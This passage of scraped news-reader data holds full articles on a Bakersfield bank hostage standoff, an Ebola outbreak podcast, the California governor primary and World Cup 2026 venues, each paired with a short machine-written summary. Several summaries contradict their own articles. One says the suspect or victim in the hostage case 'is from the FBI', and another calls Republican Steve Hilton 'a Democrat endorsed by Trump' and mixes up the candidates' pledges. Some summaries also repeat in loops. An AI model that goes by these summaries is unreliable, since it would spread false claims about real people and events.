Police had originally responded to a bomb threat at the scene.</p></div><div data-component="text-block"><p>Two hostages were released on Tuesday during negotiations. The remaining hostages released on Wednesday were unharmed, police said.</p></div><div data-component="text-block"><p>Police arrived to the scene on Tuesday at around 13:00 PST (22:00 BST), after calls of a bomb threat and reports of a man who had barricaded himself inside with several people. </p></div><div data-component="text-block"><p>Bakersfield City Hall, the local police headquarters, nearby buildings and multiple roads were closed during the hostage situation, as the police department&#39;s negotiation team began contacting the suspect via telephone.</p></div><div data-component="text-block"><p>&#34;Every single resource is at the site&#39;s disposal,&#34; Bakersfield Police Sergeant Eric Celedon told the press on Tuesday. </p></div><div data-component="text-block"><p>&#34;SWAT team, bomb squad, K9 team, gang unit, negotiators, drone team. Every single asset we have to bring this to the safest conclusion is out here right now,&#34; he continued.</p></div><div data-component="text-block"><p>Members of the FBI&#39;s Hostage Rescue Team were also on the scene, according to CNN.</p></div><div data-component="text-block"><p>Representatives for Chase Bank said on Tuesday the compnay was &#34;aware of the ongoing situation occurring at the building where our branch is located on the ground floor&#34;.</p></div><div data-component="text-block"><p>&#34;The branch is currently empty, and we are working with authorities,&#34; a Chase spokesperson told the BBC&#39;s US partner CBS News in an earlier statement.</p></div><div data-component="text-block"><p>Bakersfield mayor Karen Goh had said she was also monitoring the situation. </p></div></article></div></div>`,content_text:`Getty ImagesA man who had been holding several people hostage overnight inside a California bank has been shot dead in a standoff with the FBI, police said.The suspect was killed in "an officer-involved shooting involving Federal Bureau of Investigation personnel" on Wednesday, the Bakersfield Police Department said.The fatal shooting ended a tense period after the suspect barricaded himself with several others inside the multistory Chase Bank building on Tuesday in Bakersfield, 110 miles (177km) north of Los Angeles. Police had originally responded to a bomb threat at the scene.Two hostages were released on Tuesday during negotiations. The remaining hostages released on Wednesday were unharmed, police said.Police arrived to the scene on Tuesday at around 13:00 PST (22:00 BST), after calls of a bomb threat and reports of a man who had barricaded himself inside with several people. Bakersfield City Hall, the local police headquarters, nearby buildings and multiple roads were closed during the hostage situation, as the police department's negotiation team began contacting the suspect via telephone."Every single resource is at the site's disposal," Bakersfield Police Sergeant Eric Celedon told the press on Tuesday. "SWAT team, bomb squad, K9 team, gang unit, negotiators, drone team. Every single asset we have to bring this to the safest conclusion is out here right now," he continued.Members of the FBI's Hostage Rescue Team were also on the scene, according to CNN.Representatives for Chase Bank said on Tuesday the compnay was "aware of the ongoing situation occurring at the building where our branch is located on the ground floor"."The branch is currently empty, and we are working with authorities," a Chase spokesperson told the BBC's US partner CBS News in an earlier statement.Bakersfield mayor Karen Goh had said she was also monitoring the situation.`,cleaned_html:`<p>Summary: A man who had been holding several people hostage overnight inside a California bank has been killed by a police officer-involved shooting. The suspect barricaded himself with several others inside the building on Tuesday.<br>Points:<br>- A man from a bank in Bakersfield, CA was shot dead<br>- The suspect is from the FBI<br>- It was an officer-involved shooting involving the Federal Bureau of Investigation<br>- Two hostages were initially released, but the remaining ones are unharmed<br>- Police arrived to the scene on Tuesday at around 13:00 PST (22:00 BST)<br>Cleaned:<br>Summary: A man who had been holding several people hostage overnight inside a bank in California has been shot dead by police. The suspect is from the FBI and barricaded himself with others inside.<br>Points:<br>- A man holding hostages at a bank in California has been killed<br>- The victim is from the FBI<br>- It was an officer-involved shooting involving the Federal Bureau of Investigation<br>- Two hostages were initially released, but the remaining ones are unharmed<br>- Police arrived to the scene on Tuesday at around 13:00 PST (22:00 BST)<br>Cleaned:<br>Summary: A man who had been holding several people hostage overnight inside a bank in California has been shot dead by police. The suspect is from the FBI and barricaded himself with others inside.<br>Points:<br>- A man holding hostages at a bank in Bakersfield, CA was killed<br>- The victim is from the FBI<br>- It was an officer-involved shooting involving the Federal Bureau of Investigation<br>- Two hostages were initially released, but the remaining ones are unharmed<br>Cleaned: <br>Summary: A man who had been holding several people hostage overnight inside a bank in California has been shot dead by police. The suspect is from the FBI and barricaded himself with others inside.<br>Points:<br>- A man holding hostages at a bank in Bakersfield, CA was killed<br>- The victim is from the FBI<br>- It was an officer-involved shooting involving the Federal Bureau of Investigation<br>- Two hostages were initially released, but the remaining ones are unharmed<br>- Police arrived to the scene on Tuesday at around 13:00 PST (22:00 BST)<br>Cleaned:<br>Summary: A man who had been holding several people hostage overnight inside a bank in California has been shot dead by police. The suspect is from the FBI and barricaded himself with others inside.<br>Points:<br>- A man holding hostages at a bank in Bakersfield, CA was killed<br>- The victim is from the FBI<br>- It was an officer-involved shooting involving the Federal Bureau of Investigation<br>- Two hostages were initially released, but the remaining ones are unharmed<br>- Police arrived to the scene on Tuesday at around 13:00 PST (22:00 BST)</p>`,summary:`A man who had been holding several people hostage overnight inside a California bank was killed by a Federal Bureau of Investigation officer-involved shooting, according to Bakersfield Police Department officials. The suspect barricaded himself with several others inside the bank's building on Tuesday.
+
+• A man holding hostages at a bank in California has been shot dead
+• The victim is from the FBI
+• It was an officer-involved shooting involving the Federal Bureau of Investigation
+• Two hostages were initially released, but the remaining ones are unharmed`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg`,published_at:1780502645,fetched_at:1780509343,content_hash:`8a67dff97f20373317166c1976181fdd0fed67d092a44918b0cd0709740131d3`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:88,feed_id:11,guid:`https://www.aljazeera.com/?t=1780501903`,url:`https://www.aljazeera.com/video/the-take-2/2026/6/3/aje-onl-tt_glb_ebola26_video-030626?traffic_source=rss`,title:`The Ebola outbreak the world isn’t paying attention to`,content_html:`<div id="readability-page-1" class="page"><p>A deadly Ebola outbreak in the DRC is spreading across borders, with no approved vaccine or treatment for this strain.</p><div aria-live="polite" aria-atomic="true"><p>A fast-growing Ebola outbreak in the Democratic Republic of the Congo has crossed borders, raising alarms far beyond Central Africa. This time, the virus is a strain with no approved vaccine or treatment. As cases rise and governments scramble to respond, can the outbreak be contained before it spreads further?</p><p><strong>In this episode:\xA0</strong></p><ul>
+<li>Catherine Soi (<a href="https://x.com/cate_soi">@cate_soi</a>), Al Jazeera Correspondent</li>
+</ul><p><strong>Episode credits:</strong></p><p><em>This episode was produced by Marcos Bartolomé and Sarí el-Khalili with Spencer Cline, Tamara Khandaker, Jana Dabliz, and our host, Malika Bilal. It was edited by Tamara Khandaker.\xA0</em></p><p><em>Our sound designer is Alex Roldan. Rick Rush mixed this episode. Our video editors are Hisham Abu Salah and Mohannad al-Melhem. Alexandra Locke is The Take’s executive producer.\xA0</em></p><p><strong>Connect with us:</strong></p><p>@AJEPodcasts on <a href="https://twitter.com/AJEPodcasts">X</a>, <a href="https://www.instagram.com/ajepodcasts/">Instagram</a>, <a href="https://www.facebook.com/AJEPodcasts">Facebook</a>, and <a href="https://www.youtube.com/playlist?list=PLzGHKb8i9vTwjZkiFu6LhzsLUKFkYO60I">YouTube</a></p></div></div>`,content_text:`A deadly Ebola outbreak in the DRC is spreading across borders, with no approved vaccine or treatment for this strain.A fast-growing Ebola outbreak in the Democratic Republic of the Congo has crossed borders, raising alarms far beyond Central Africa. This time, the virus is a strain with no approved vaccine or treatment. As cases rise and governments scramble to respond, can the outbreak be contained before it spreads further?In this episode:\xA0
+Catherine Soi (@cate_soi), Al Jazeera Correspondent
+Episode credits:This episode was produced by Marcos Bartolomé and Sarí el-Khalili with Spencer Cline, Tamara Khandaker, Jana Dabliz, and our host, Malika Bilal. It was edited by Tamara Khandaker.\xA0Our sound designer is Alex Roldan. Rick Rush mixed this episode. Our video editors are Hisham Abu Salah and Mohannad al-Melhem. Alexandra Locke is The Take’s executive producer.\xA0Connect with us:@AJEPodcasts on X, Instagram, Facebook, and YouTube`,summary:`• The Ebola outbreak in the Democratic Republic of the Congo (DRC) has spread across borders, raising concerns for countries around the world. While there are no approved vaccines or treatments for this strain, governments are working to contain the virus and respond to it with appropriate measures. The article emphasizes that while some progress is being made, more needs to be done to stop the spread of the Ebola outbreak in the DRC.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/image-1780501939.jpg?resize=1920%2C1080&quality=80`,published_at:1780502248,fetched_at:1780509344,content_hash:`50e584119f4fb606d8e90184e75ace55a0fbe4a527d489f3144c773c40b9ab86`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:63,feed_id:9,guid:`https://www.bbc.com/news/articles/cn8p0yz512no#0`,url:`https://www.bbc.com/news/articles/cn8p0yz512no?at_medium=RSS&at_campaign=rss`,title:`Ex-UK political aide and Biden cabinet secretary lead California governor primary vote count`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-component="headline-block"><p><h2>Ex-UK political aide and Biden cabinet secretary lead California governor primary vote count</h2></p></div><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T15:32:30.954Z">2 hours ago</time></p><p><span data-testid="byline-contributors"><p><span>Shaimaa Khalil,</span><span data-testid="byline-contributors-contributor-0-role-location">Los Angeles correspondent</span><span>and</span></p><p><span>Kayla Epstein</span></p></span></p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg.webp" loading="eager" alt="Los Angeles Times via Getty Images Both candidates appear on stage near a podium. They are shaking hands and smiling. "/><span>Los Angeles Times via Getty Images</span></p></div><p><figcaption>Steve Hilton (left) and Xavier Becerra are in the lead</figcaption></p></figure></div><div data-component="text-block"><p>The California governor&#39;s race remains up in the air a day after the primary vote, with British-American former TV host Steve Hilton and onetime Biden cabinet secretary Xavier Becerra at the top of a crowded field.</p></div><div data-component="text-block"><p>The contest could take several days to decide due to the volume of postal ballots cast on Tuesday to pick the top two candidates for November&#39;s general election.</p></div><div data-component="text-block"><p>Becerra, a Democrat, has vowed to oppose President Donald Trump. Hilton is a Republican endorsed by Trump. </p></div><div data-component="text-block"><p>Another Democrat, billionaire climate activist Tom Steyer, was in third place as counting continued. Current Governor Gavin Newsom, a Democrat, is not running for re-election due to term limits.</p></div><div data-component="text-block"><p>Becerra, who was health secretary under President Joe Biden, has promised he will  freeze insurance and utility rates.</p></div><div data-component="text-block"><p>Hilton, who was once a top adviser to ex-UK Prime Minister David Cameron before going on to host his own show on Fox News, has pledged to make the state affordable by cutting taxes and regulations.</p></div><div data-component="text-block"><p>The governor&#39;s race ought to have been straightforward for Democrats, but it descended into disarray.</p></div><div data-component="text-block"><p>A large field of Democrats jumped in due to the lack of a star politician who could have dominated the election.</p></div><div data-component="text-block"><p>It became the most expensive California gubernatorial race on record, with immense ad spending by Steyer and Silicon Valley support for another Democratic candidate, San Jose Mayor Matt Mahan. </p></div><div data-component="text-block"><p>Former Democratic congresswoman Katie Porter also joined the fray.</p></div><div data-component="text-block"><p>The contest was shaken up after one of the leading candidates, Democratic congressman Eric Swalwell, dropped out and resigned from Congress in April amid allegations of sexual assault, which he denied.</p></div><div data-component="text-block"><p>The prospect of several Democrats splintering the vote sparked concerns from the party&#39;s high command that two Republicans could advance in deeply liberal California. </p></div><div data-component="text-block"><p>The state&#39;s so-called jungle primary system picks the two contenders with the most votes, regardless of political party.</p></div><div data-component="text-block"><p>There were more than 60 candidates, including one who changed his name to &#34;Barack Obama Shaw&#34;. </p></div><div data-component="text-block"><p>Becerra framed his campaign around his record in Congress in Washington DC, and in California state office. </p></div><div data-component="text-block"><p>Hilton, as an adviser to former UK PM Cameron, was known for helping to shape Conservative Party strategy during a turbulent period in British politics that resulted in Brexit. </p></div><div data-component="text-block"><p>He was also known for his California fashion sense, often without tie or even barefoot.</p></div><div data-component="text-block"><p>In California, he has campaigned to &#34;disrupt the system&#34;, vowing to solve the homelessness crisis and arguing the state should co-operate more closely with the federal government on immigration enforcement and roll back sanctuary policies.</p></div><div data-component="text-block"><p>Should he advance to the general election, he could face an uphill battle in a state where Democratic voters outnumber Republicans by roughly two-to-one. </p></div><div data-component="text-block"><p>California&#39;s last Republican governor was Arnold Schwarzenegger, whose term ended in 2011.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/c828/live/2d38b5f0-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp" loading="lazy" alt="San Francisco Chronicle via Getty Images California Governor Gavin Newsom speaks at a podium bearing the California state seal. The California flag, which features a grizzly bear and a red star, is visible in the background."/><span>San Francisco Chronicle via Getty Images</span></p></div><p><figcaption>California&#39;s current governor, Gavin Newsom, may run for the White House</figcaption></p></figure></div><div data-component="text-block"><p>The state may have to wait another day, if not more, to find out which two candidates will duel in November, because California relies heavily on vote-by-mail. </p></div><div data-component="text-block"><p>It is the most populous state in the US and is the fifth largest economy in the world in its own right. </p></div><div data-component="text-block"><p>California has also been at the forefront of some of America&#39;s most contentious political battles, from immigration and climate policy to homelessness and housing affordability, and most recently soaring petrol prices, a result of the US-Iran war and the highest fuel taxes in the nation.</p></div><div data-component="text-block"><p>The governor&#39;s race accompanied another heavily watched primary for mayor in Los Angeles, where political veterans battled against a reality star.</p></div><div data-component="text-block"><p>As the tally continues, Angelenos are waiting to see if she will face Democratic city councilmember Nithya Raman, or reality television star Spencer Pratt, who is running as a Republican.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/6f9f/live/6c15ab40-5f5e-11f1-89a3-d1f559421220.png.webp" loading="lazy" alt="BBC"/></p></div></figure></div></article></div></div>`,content_text:`Ex-UK political aide and Biden cabinet secretary lead California governor primary vote count2 hours agoShaimaa Khalil,Los Angeles correspondentandKayla EpsteinLos Angeles Times via Getty ImagesSteve Hilton (left) and Xavier Becerra are in the leadThe California governor's race remains up in the air a day after the primary vote, with British-American former TV host Steve Hilton and onetime Biden cabinet secretary Xavier Becerra at the top of a crowded field.The contest could take several days to decide due to the volume of postal ballots cast on Tuesday to pick the top two candidates for November's general election.Becerra, a Democrat, has vowed to oppose President Donald Trump. Hilton is a Republican endorsed by Trump. Another Democrat, billionaire climate activist Tom Steyer, was in third place as counting continued. Current Governor Gavin Newsom, a Democrat, is not running for re-election due to term limits.Becerra, who was health secretary under President Joe Biden, has promised he will  freeze insurance and utility rates.Hilton, who was once a top adviser to ex-UK Prime Minister David Cameron before going on to host his own show on Fox News, has pledged to make the state affordable by cutting taxes and regulations.The governor's race ought to have been straightforward for Democrats, but it descended into disarray.A large field of Democrats jumped in due to the lack of a star politician who could have dominated the election.It became the most expensive California gubernatorial race on record, with immense ad spending by Steyer and Silicon Valley support for another Democratic candidate, San Jose Mayor Matt Mahan. Former Democratic congresswoman Katie Porter also joined the fray.The contest was shaken up after one of the leading candidates, Democratic congressman Eric Swalwell, dropped out and resigned from Congress in April amid allegations of sexual assault, which he denied.The prospect of several Democrats splintering the vote sparked concerns from the party's high command that two Republicans could advance in deeply liberal California. The state's so-called jungle primary system picks the two contenders with the most votes, regardless of political party.There were more than 60 candidates, including one who changed his name to "Barack Obama Shaw". Becerra framed his campaign around his record in Congress in Washington DC, and in California state office. Hilton, as an adviser to former UK PM Cameron, was known for helping to shape Conservative Party strategy during a turbulent period in British politics that resulted in Brexit. He was also known for his California fashion sense, often without tie or even barefoot.In California, he has campaigned to "disrupt the system", vowing to solve the homelessness crisis and arguing the state should co-operate more closely with the federal government on immigration enforcement and roll back sanctuary policies.Should he advance to the general election, he could face an uphill battle in a state where Democratic voters outnumber Republicans by roughly two-to-one. California's last Republican governor was Arnold Schwarzenegger, whose term ended in 2011.San Francisco Chronicle via Getty ImagesCalifornia's current governor, Gavin Newsom, may run for the White HouseThe state may have to wait another day, if not more, to find out which two candidates will duel in November, because California relies heavily on vote-by-mail. It is the most populous state in the US and is the fifth largest economy in the world in its own right. California has also been at the forefront of some of America's most contentious political battles, from immigration and climate policy to homelessness and housing affordability, and most recently soaring petrol prices, a result of the US-Iran war and the highest fuel taxes in the nation.The governor's race accompanied another heavily watched primary for mayor in Los Angeles, where political veterans battled against a reality star.As the tally continues, Angelenos are waiting to see if she will face Democratic city councilmember Nithya Raman, or reality television star Spencer Pratt, who is running as a Republican.`,summary:`• Steve Hilton and Xavier Becerra lead California governor primary vote count in the race.
+• The contest could take several days due to large field of Democrats.
+• Becca vowed to oppose Trump and cut taxes and regulations.
+• Hilton is a Democrat endorsed by Trump and has pledged to make state affordable.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/b9a5/live/3ae81b30-5efe-11f1-8b8c-6d33e1d5abb6.jpg`,published_at:1780500750,fetched_at:1780509343,content_hash:`547439360a6384ea57fb5894a2d67fc7eb1b4963c8e189c67d64ec3d2f85b335`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:94,feed_id:11,guid:`https://www.aljazeera.com/?t=1772081746`,url:`https://www.aljazeera.com/sports/2026/6/3/fifa-world-cup-2026-stadiums-matches-us-canada-mexico?traffic_source=rss`,title:`Which World Cup 2026 stadiums will host matches in US, Canada and Mexico?`,content_html:`<div id="readability-page-1" class="page"><div aria-live="polite" aria-atomic="true"><p data-start="605" data-end="714">Football’s biggest tournament returns as the FIFA World Cup 2026 unfolds across three countries.</p><p>The United States, Mexico and Canada will host matches from June 11 to July 19, with an expanded pool of 48 teams fighting to be crowned world champions.</p><section><h2>Recommended Stories </h2><span>list of 4 items</span><ul><li><span>list 1 of 4</span><a href="https://www.aljazeera.com/sports/2026/6/2/best-young-players-to-watch-at-fifa-world-cup-2026">From Yildiz to Diomande: Top 10 rising stars to watch at the World Cup</a></li><li><span>list 2 of 4</span><a href="https://www.aljazeera.com/news/2026/6/3/us-artist-sues-fifa-over-destruction-of-dallas-whale-mural-for-world-cup">US artist sues FIFA over destruction of Dallas whale mural for World Cup</a></li><li><span>list 3 of 4</span><a href="https://www.aljazeera.com/sports/2026/6/3/morocco-world-cup-2026-preview-players-to-watch-group-and-squad-list">World Cup contenders: Are Morocco ready to go all the way this time?</a></li><li><span>list 4 of 4</span><a href="https://www.aljazeera.com/sports/2026/6/3/lamine-yamal-and-nico-williams-set-to-be-fit-for-spains-world-cup-opener">Lamine Yamal and Nico Williams set to be fit for Spain’s World Cup opener</a></li></ul><span>end of list</span></section><p>Here is a detailed breakdown of the 16 stadium venues and 16 cities hosting the event, stretching from Boston, located in the far east of the US, to Vancouver on the west coast of Canada, and to Guadalajara in central Mexico.</p><p>Al Jazeera also has a <a href="https://interactive.aljazeera.com/aje/2026/world-cup-2026-stadiums/?utm_source=www.aljazeera.com&amp;utm_medium=website&amp;utm_campaign=ucms">virtual tour of all the World Cup 2026 stadiums.</a></p><p><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/04/INTERACTIVE-Football-FIFA-Venues-of-World-Cup-2026-1776670771.png?quality=80" alt="INTERACTIVE-Football FIFA Venues of World Cup 2026-1776670771" data-interactive="true" fetchpriority="low"/></p><h2 id="stadium-and-host-cities-guide-fifa-world-cup-2026">Stadium and host cities guide: FIFA World Cup 2026</h2><h2 id="1-atlanta-stadium">1. Atlanta Stadium</h2><p><strong>Location</strong>: Atlanta, Georgia, US<br/>
+<strong>Capacity</strong>:\xA075,000<br/>
+<strong>Built</strong>:\xA02017<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 15/06: Spain vs Cape Verde (12 pm ET/16:00 GMT)<br/>
+⚽ 18/06: Czechia vs South Africa (12 pm ET/16:00 GMT)<br/>
+⚽ 21/06: Spain vs Saudi Arabia (12 pm ET/16:00 GMT)<br/>
+⚽ 24/06: Morocco vs Haiti (6 pm ET/22:00 GMT)<br/>
+⚽ 27/06: Congo DR vs Uzbekistan (7:30 pm ET/23:30 GMT)<br/>
+⚽ 01/07: Group L winners vs Group E/H/I/J/K third place (12 pm ET/16:00 GMT)<br/>
+⚽ 07/07: Round of 16 (12 pm ET/16:00 GMT)<br/>
+⚽ 15/07: Semifinal (3 pm ET/19:00 GMT)</p><p>This southern US city of more than 500,000 people is famous for another kind of football (American college football), home to the Atlanta United Major League Soccer (MLS) team, and the site of undoubtedly the most space-age stadium architecture of the host cities, the Atlanta Stadium.</p><p>Eight FIFA World Cup 2026 fixtures will take place in Atlanta, including a semifinal and two other knockout games. Spain, the pre-tournament favourites and reigning European champions, will play two group games here.</p><p>The venue, called the Mercedes-Benz Stadium due to sponsorship, hosted six FIFA Club World Cup matches last year. It boasts a retractable roof and a 360-degree halo video display.</p><figure id="attachment_3747650" aria-describedby="caption-attachment-3747650"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2025/06/ATLANTA_2024-09-29T090546Z_153340349_RC29AAA8QZKA_RTRMADP_3_SOCCER-FIFA-CLUB-WORLDCUP-1748858895-e1749384044509.jpg?w=770&amp;resize=770%2C507&amp;quality=80" alt="Mercedes-Benz stadium in Atlanta." fetchpriority="low"/><figcaption id="caption-attachment-3747650">Atlanta Stadium also hosts the professional NFL team, the Atlanta Falcons, ice hockey and music concerts [File: Kirby Lee/USA TODAY Sports via Reuters]</figcaption></figure><h2 id="2-boston-stadium">2. Boston Stadium</h2><p><strong>Location</strong>: Foxborough, Massachusetts, US<br/>
+<strong>Capacity</strong>: 65,000<br/>
+<strong>Built</strong>: 2002<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 13/06: Haiti vs Scotland (9 pm ET/01:00 GMT next day)<br/>
+⚽ 16/06: Iraq vs Norway (6 pm ET/22:00 GMT)<br/>
+⚽ 19/06: Scotland vs Morocco (6 pm ET/22:00 GMT)<br/>
+⚽ 23/06: England vs Ghana (4 pm ET/20:00 GMT)<br/>
+⚽ 26/06: Norway vs France (3 pm ET/19:00 GMT)<br/>
+⚽ 29/06: Group E winners vs Group A/B/C/D/F third place (4:30 pm ET/20:30 GMT)<br/>
+⚽ 09/07: Round of 16 (4 pm ET/20:00 GMT)</p><p>Located 22 miles (35 km) southwest of Downtown Boston, this multipurpose stadium serves as the home turf of the National Football League’s (NFL’s) New England Patriots and the MLS’s New England Revolution. The venue has hosted several major tournaments, including the FIFA Women’s World Cup 2003, the Copa America Centenario, and the CONCACAF Gold Cup.</p><p>Boston Stadium – commonly known as Gillette Stadium to fans – underwent a major renovation project ahead of the World Cup, with the ground now boasting the largest outdoor high-definition stadium video board in the country (measuring 22,000 square feet).</p><figure id="attachment_4342489" aria-describedby="caption-attachment-4342489"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/02/AP25274049483421-1772171852.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="A general view of Gillette Stadium during the first half of an NFL football game between the New England Patriots and the Carolina Panthers, Sunday, Sept. 28, 2025, in Foxborough, Mass. (AP Photo/Greg M. Cooper)" fetchpriority="low"/><figcaption id="caption-attachment-4342489">A general view of Gillette Stadium during the first half of an NFL game [File: Greg M Cooper/AP Photo]</figcaption></figure><h2 id="3-dallas-stadium">3. Dallas Stadium</h2><p id="location-atlanta-georgia-usa"><strong>Location</strong>: Arlington, Texas, US<br/>
+<strong>Capacity</strong>: 94,000<br/>
+<strong>Built</strong>: 2009<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 14/06: Netherlands vs Japan (4 pm ET/20:00 GMT)<br/>
+⚽ 17/06: England vs Croatia (4 pm ET/20:00 GMT)<br/>
+⚽ 22/06: Argentina vs Austria (1 pm ET/17:00 GMT)<br/>
+⚽ 25/06: Japan vs Sweden (7 pm ET/23:00 GMT)<br/>
+⚽ 27/06: Jordan vs Argentina (10 pm ET/02:00 GMT next day)<br/>
+⚽ 30/06: Group E runners-up vs Group I runners-up (1 pm ET/17:00 GMT)<br/>
+⚽ 03/07: Group D runners-up vs Group G runners-up (2 pm ET/18:00 GMT)<br/>
+⚽ 06/07: Round of 16 (3 pm ET/19:00 GMT)<br/>
+⚽ 14/07: Semifinal (3 pm ET/19:00 GMT)</p><p>The biggest stadium of the 2026 World Cup, this venue boasts a whopping 94,000 seats and 25,000 square feet (2,300 square metres) of video displays inside.</p><p>It will host the most World Cup matches (nine): five group games – including two of defending world champions Argentina – and four knockout ties, which feature a semifinal.</p><p>Since opening in 2009, the Dallas Stadium has been the home of the five-time Super Bowl champions Dallas Cowboys and has also hosted the CONCACAF Gold Cup and Mexico national team matches.</p><p>The stadium is widely referred to as Jerry World after Dallas Cowboys owner Jerry Jones, who originally envisioned it as a large entertainment venue.</p><figure id="attachment_3321711" aria-describedby="caption-attachment-3321711"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2024/11/AP24316851775055-1731514026.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="AT&amp;T Stadium." fetchpriority="low"/><figcaption id="caption-attachment-3321711">Dallas Stadium, commonly known as AT&amp;T Stadium, has been the home of the NFL’s Dallas Cowboys since 2009 [File: Jeffrey McWhorter/AP Photo]</figcaption></figure><h2 id="4-houston-stadium">4. Houston Stadium</h2><p><strong>Location</strong>: Houston, Texas, US<br/>
+<strong>Capacity</strong>: 72,000<br/>
+<strong>Built</strong>: 2002<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 14/06: Germany vs Curacao (1 pm ET/17:00 GMT)<br/>
+⚽ 17/06: Portugal vs Congo DR (1 pm ET/17:00 GMT)<br/>
+⚽ 20/06: Netherlands vs Sweden (1 pm ET/17:00 GMT)<br/>
+⚽ 23/06: Portugal vs Uzbekistan (1 pm ET/17:00 GMT)<br/>
+⚽ 26/06: Cape Verde vs Saudi Arabia (8 pm ET/00:00 GMT next day)<br/>
+⚽ 29/06: Group C winners vs Group F runners-up (1 pm ET/17:00 GMT)<br/>
